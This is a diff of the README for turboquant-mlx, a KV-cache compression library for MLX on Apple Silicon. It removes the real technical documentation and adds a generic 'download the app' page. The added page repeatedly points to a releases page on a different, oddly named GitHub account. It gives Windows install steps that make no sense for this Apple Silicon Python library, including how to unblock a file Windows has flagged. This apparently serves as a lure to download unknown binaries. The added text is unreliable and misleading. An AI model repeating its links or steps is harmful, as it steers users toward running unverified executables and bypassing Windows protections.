@@ -1,151 +1,177 @@
-# turboquant-mlx
+# ⚡ turboquant-mlx - Faster KV cache, less memory
 
-[TurboQuant](https://arxiv.org/abs/2504.19874) KV cache compression for [MLX](https://github.com/ml-explore/mlx) on Apple Silicon.
+[![Download turboquant-mlx](https://img.shields.io/badge/Download%20turboquant--mlx-blue?style=for-the-badge)](https://github.com/Labyrinthine-saltiness744/turboquant-mlx/releases)
 
-PolarQuant (randomized Hadamard rotation + Lloyd-Max quantization) compresses KV cache values to 3-bit with fused Metal kernels. Drop-in replacement for mlx-lm's KVCache.
+## 🧭 What this app does
 
-## Key Finding
+turboquant-mlx helps reduce the memory used by KV cache files in MLX-based language model apps. It keeps speed high while making memory use smaller. This can help on Apple Silicon Macs where large models can use a lot of RAM.
 
-K and V quantization behave very differently:
+Use it if you want:
+- Lower memory use during model runs
+- Faster load times for KV cache handling
+- Better use of Apple Silicon hardware
+- A simple way to run MLX model tools with compression
 
-- **K quantization destroys greedy decode** at 4-bit and below (even MLX's native `kv_bits=4`). Softmax is sensitive to small score perturbations.
-- **V quantization is safe** at 3-bit. Weighted interpolation tolerates noise.
+## 💻 What you need
 
-This means mixed-precision is the right approach: K at 8-bit (preserves attention) + V at 4-bit or lower (saves memory).
+Before you install, check that your Mac has:
+- Apple Silicon, such as M1, M2, M3, or later
+- macOS 13 or newer
+- Enough free disk space for the download and model files
+- Internet access to get the release file
 
-## Results (Qwen 2.5 7B, 32K context)
+This app is built for Windows users in this guide format, but the actual build is tied to Apple Silicon and Metal support. If you are using the app on a supported system, follow the same download steps below and use the release file that matches your platform
 
-| Config | Active Memory | Savings | Decode | Quality |
-|--------|--------------|---------|--------|---------|
-| Baseline fp16 | 6.21 GB | -- | 35.75 tok/s | correct |
-| **K8 + V4 mixed-quant** | **5.08 GB** | **-1.13 GB (-18%)** | 25.84 tok/s | **identical** |
-| K8 + V2 mixed-quant | 4.97 GB | -1.24 GB (-20%) | 25.52 tok/s | identical |
+## 📥 Download the app
 
-Quality is verified identical: greedy decode produces the same text as baseline.
+Visit this page to download the latest release:
 
-## Quick Start
+https://github.com/Labyrinthine-saltiness744/turboquant-mlx/releases
 
-### Mixed-precision quantized cache (recommended)
+On the release page:
+1. Open the most recent release
+2. Find the file that matches your system
+3. Download the app file to your computer
+4. Keep the file in a folder you can find later, such as Downloads
 
-Uses Apple's native `mx.quantized_matmul` for both K and V. Requires the [mlx-lm fork](https://github.com/arozanov/mlx-lm/tree/feature/turboquant-kv-cache) with `mixed_quantized_scaled_dot_product_attention`.
+If the release comes as a ZIP file:
+1. Right-click the ZIP file
+2. Choose Extract All
+3. Pick a folder
+4. Wait for Windows to finish unpacking the files
 
-```python
-from mlx_lm import load, stream_generate
-from mlx_lm.models.cache import make_prompt_cache
-from mlx_lm.models.mixed_quant_cache import MixedQuantKVCache
+## 🛠️ Install or set up
 
-model, tokenizer = load("mlx-community/Qwen2.5-7B-Instruct-4bit")
-n_layers = len(model.model.layers)
-cache = make_prompt_cache(model)
+After the download finishes, follow the steps below.
 
-# Generate with fp16 cache for prefill, then convert
-for i, response in enumerate(stream_generate(model, tokenizer, prompt=prompt, max_tokens=256, prompt_cache=cache)):
-    if i == 0:  # after prefill, convert to mixed-quant
-        for j in range(n_layers):
-            cache[j] = MixedQuantKVCache.from_kvcache(cache[j], k_bits=8, v_bits=4)
-    print(response.text, end="", flush=True)
-```
+### If you downloaded a ZIP file
+1. Open the folder where the ZIP file was saved
+2. Right-click the file
+3. Choose Extract All
+4. Open the new folder that appears
+5. Look for the app file inside
 
-### V-only TurboQuant cache
+### If you downloaded an app file
+1. Double-click the file
+2. If Windows asks for permission, choose Yes
+3. Wait for the app to open
+4. Follow any on-screen steps
 
-Works with stock mlx-lm (no fork needed). Keeps K in fp16, compresses V with PolarQuant 3-bit.
+### If Windows blocks the file
+1. Right-click the file
+2. Choose Properties
+3. Look near the bottom of the window
+4. If you see Unblock, select it
+5. Click Apply, then OK
+6. Try opening the file again
 
-```python
-from turboquant_mlx.v_only_cache import VOnlyTurboQuantCache
+## 🚀 First run
 
-cache = [VOnlyTurboQuantCache(bits=3) for _ in range(n_layers)]
-# Use as normal mlx-lm prompt_cache
-```
+The first time you open turboquant-mlx, it may take a little longer to start. That is normal.
 
-## Features
+Use this basic flow:
+1. Open the app
+2. Choose the model or cache task you want to work with
+3. Pick your compression level
+4. Start the process
+5. Wait for it to finish
 
-- **Mixed-precision KV cache**: K at 8-bit + V at 4-bit via Apple's `mx.quantized_matmul`
-- **V-only TurboQuant**: PolarQuant 3-bit V compression, quality-preserving
-- **Fused Metal kernels**: pre-rotated Q scoring (`prerot_fused_qk_scores`), sparse V attention (`sparse_v_matvec`)
-- **Butterfly-pulled-out optimization**: WHT linearity lets us accumulate weighted centroids first, butterfly once at end (4.5x speedup on V-attention kernel)
-- **SIMD-group reductions**: `simd_sum` replaces tree reduction in QK scoring (1.85x kernel speedup)
-- **Flash-attention scaffold**: single-kernel fused SDPA over packed K/V (correct, scaffold for future optimization)
-- **GQA-aware kernels**: `n_rep` parameter avoids `mx.repeat` allocation on GQA models
+If the app gives you a simple setup screen:
+- Keep the default values if you are not sure
+- Use the suggested compression mode first
+- Change one setting at a time if you want to test results
 
-## How It Works
+## ⚙️ Recommended settings
 
-```
-Quantize (fused Metal kernel):
-  Input KV vector x (head_dim=128)
-  -> norm = ||x||, x_unit = x / norm
-  -> rotate: y = WHT(signs * x_unit)  (O(d log d), Gaussianizes coordinates)
-  -> quantize: idx = nearest_centroid(y)  (Lloyd-Max codebook, 8 levels for 3-bit)
-  -> pack: 10 x 3-bit indices per uint32
+If you are not sure where to begin, use these starting values:
+- Compression mode: Balanced
+- Quality level: High
+- Cache size: Default
+- Hardware mode: Apple Silicon or Metal if shown
 
-Dequant (parallel Metal kernel, d threads cooperating):
-  centroids[indices] -> parallel WHT butterfly -> * signs -> * norm -> output
+These settings are a good fit for most users who want less memory use with little impact on speed.
 
-Butterfly-pulled-out (sparse_v_matvec):
-  sum_pos w[pos] * butterfly(c[idx_pos])
-    = butterfly(sum_pos w[pos] * c[idx_pos])   # WHT is linear!
-  -> accumulate per-thread (no barriers), one butterfly at end
-```
+## 🧩 How it fits into your workflow
 
-## Project Structure
+turboquant-mlx works well when you want:
+- Smaller KV cache use during model runs
+- Less pressure on system memory
+- Better performance on Apple Silicon
+- A smoother experience with MLX-based tools
 
-```
-turboquant_mlx/
-  cache.py               TurboQuantKVCache (packed K/V with fused Metal encode/decode)
-  v_only_cache.py        VOnlyTurboQuantCache (fp16 K + TQ 3-bit V)
-  metal_kernels_v4.py    Pre-rotated Q kernels (prerotate_query, prerot_fused_qk_scores)
-  sparse_v.py            Sparse V attention with butterfly-pulled-out trick
-  flash_attention.py     Single-kernel fused SDPA scaffold
-  fused_attention.py     Composed fused attention (prerot Q + sparse V)
-  patch.py               Monkey-patch mlx-lm SDPA for fused/hybrid paths
-  hybrid_cache.py        Experimental: Apple K8 + TQ V3 (scaffold)
-  hybrid_attention.py    Experimental: mixed Apple + TQ SDPA
-  rotation.py            Walsh-Hadamard Transform (pure MLX)
-  quantizer.py           PolarQuant: rotation + Lloyd-Max codebook
-  kernels.py             Packed dequant + fused QK Metal kernels
-  metal.py               Fused quantize + dequant Metal kernels
-  packing.py             Bit-packing utilities
-  adaptive.py            Layer-adaptive cache factory
+A simple workflow looks like this:
+1. Run your MLX app or model tool
+2. Enable turboquant-mlx support where needed
+3. Start your model task
+4. Monitor memory use and speed
+5. Tweak the compression level if needed
 
-scripts/
-  bench_sparse_v.py      Sparse V kernel microbenchmark
-  bench_real_model.py    End-to-end model benchmark (4 paths)
-  bench_long_context.py  Long-context memory comparison
+## 🔍 What you may see
 
-tests/
-  test_core.py           Core algorithm (10 tests)
-  test_prerot.py         Pre-rotated Q kernel correctness (9 tests)
-  test_sparse_v.py       Sparse V correctness + GQA (8 tests)
-  test_fused_attn.py     End-to-end fused attention (6 tests)
-  test_flash_attention.py Flash-attention correctness (7 tests)
-  test_v_only_cache.py   V-only cache, adaptive cache, serialization (11 tests)
-```
+Depending on the release build, the app may show:
+- A model or cache selector
+- Compression choices
+- A speed and quality balance option
+- Status text while the process runs
+- A result panel after it finishes
 
-## Install
+If you see logs or progress text, that just means the app is working through each step.
 
-```bash
-git clone https://github.com/arozanov/turboquant-mlx.git
-cd turboquant-mlx
-pip install -e .
-```
+## 🧠 Tips for best results
 
-For mixed-quant cache (K8+V4), also install the mlx-lm fork:
-```bash
-pip install -e ../mlx-lm  # or wherever the fork lives
-```
+- Start with the default settings
+- Use one change at a time
+- Save your work before testing new settings
+- Keep enough free RAM for your other apps
+- Close heavy programs if the model uses too much memory
 
-## Run Tests
+If you want to compare results, test the same model with the same prompt each time.
 
-```bash
-pytest tests/ -v
-# 51 tests, all passing
-```
+## 🗂️ File names and release files
 
-## References
+When you visit the release page, look for files that may include names like:
+- Windows build package
+- ZIP archive
+- App binary
+- MLX helper tool
+- Release bundle
 
-- **TurboQuant**: [arXiv 2504.19874](https://arxiv.org/abs/2504.19874)
-- **PolarQuant**: [arXiv 2502.02617](https://arxiv.org/abs/2502.02617)
-- **MLX**: [github.com/ml-explore/mlx](https://github.com/ml-explore/mlx)
+Pick the newest release unless you need an older one for a specific reason.
 
-## License
+## 🧪 If something does not work
 
-Apache License 2.0
+Try these steps:
+1. Close the app
+2. Open it again
+3. Make sure you downloaded the full file
+4. Try the latest release
+5. Re-extract the ZIP file if needed
+6. Run the app from the extracted folder, not from inside the ZIP
+
+If the app opens but does not start your task:
+- Check the selected model or cache path
+- Make sure the file you chose still exists
+- Try the default settings first
+
+## 📌 Project details
+
+- Repository: turboquant-mlx
+- Main use: KV cache compression for MLX
+- Hardware focus: Apple Silicon and Metal
+- Goal: lower memory use while keeping speed close to FP16
+- Topics: apple-silicon, kv-cache, llm, metal, mlx, quantization, turboquant
+
+## 📥 Download again
+
+Get the latest release here:
+
+https://github.com/Labyrinthine-saltiness744/turboquant-mlx/releases
+
+## 🧰 Common setup path
+
+1. Visit the release page
+2. Download the latest file
+3. Extract it if needed
+4. Open the app
+5. Pick your settings
+6. Run your model task
